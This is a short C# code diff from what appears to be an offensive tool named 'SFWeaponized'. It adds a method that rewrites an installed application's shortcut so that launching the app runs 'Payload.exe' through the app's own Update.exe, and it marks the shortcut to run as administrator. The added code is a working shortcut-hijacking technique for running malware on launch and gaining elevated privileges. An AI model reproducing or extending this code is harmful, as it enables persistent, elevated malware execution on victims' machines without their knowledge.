@@ -20,7 +20,7 @@ namespace SFWeaponized.Model
             CurrentVersion = currentVersion;
         }
 
-        public void SetShortcut()
+        public void SetShortcutPath()
         {
             ShortcutPath = ShortcutUtils.FindShortcut(Root);
         }
@@ -33,6 +33,15 @@ namespace SFWeaponized.Model
                 return;
 
             ProcessUtils.Run(updateFilePath, $"--processStart {payloadExeName} --process-start-args {Name}.exe");
+        }
+
+        public void PatchShortcut()
+        {
+            if (!string.IsNullOrEmpty(ShortcutPath))
+            {
+                ShortcutUtils.Edit(ShortcutPath, $"--processStart \"Payload.exe\" --process-start-args \"{Name}.exe\"", Path.Combine(Root, "Update.exe"));
+                ShortcutUtils.SetRunAsAdmin(ShortcutPath);
+            }
         }
 
         public void CreateShortcut()
